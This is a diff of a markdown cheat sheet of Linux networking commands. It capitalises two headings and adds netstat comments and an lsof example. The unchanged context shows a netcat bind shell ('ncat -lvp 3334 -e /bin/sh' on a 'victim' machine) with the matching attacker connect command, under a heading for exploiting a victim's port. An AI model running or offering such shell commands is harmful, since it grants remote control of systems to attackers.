@@ -163,7 +163,7 @@ Prints the n/w hop taken to resolve the dns. It figures it out by sending packet
 $ traceroute www.google.com
 ```
 netcat
-bind shell
+Bind shell
 
 When you can exploit any port of the victom machine
 ```bash
@@ -172,7 +172,7 @@ $ ncat -lvp 3334 -e /bin/sh
 # On the attack machine
 $ ncat <ip_address> <port> 
 ```
-reverse shell
+Reverse shell
 
 When you can gain entry to one open port but can't use that port as its already being used.
 ```bash
@@ -329,10 +329,13 @@ $ tracepath -n google.com
 
 # display route table
 $ netstat -rn
+
 # display listening socket (tcp), eg. check if nginx is listening on port 80
 $ netstat -ntlp
 # for udp
 $ netstat -nulp
+# List open files (as everything in linux is files, this displays whats running on a port)
+$lsof -i tcp:3000
 
 # packet sniffing using tcpdump
 # -n --> numerical address and ports
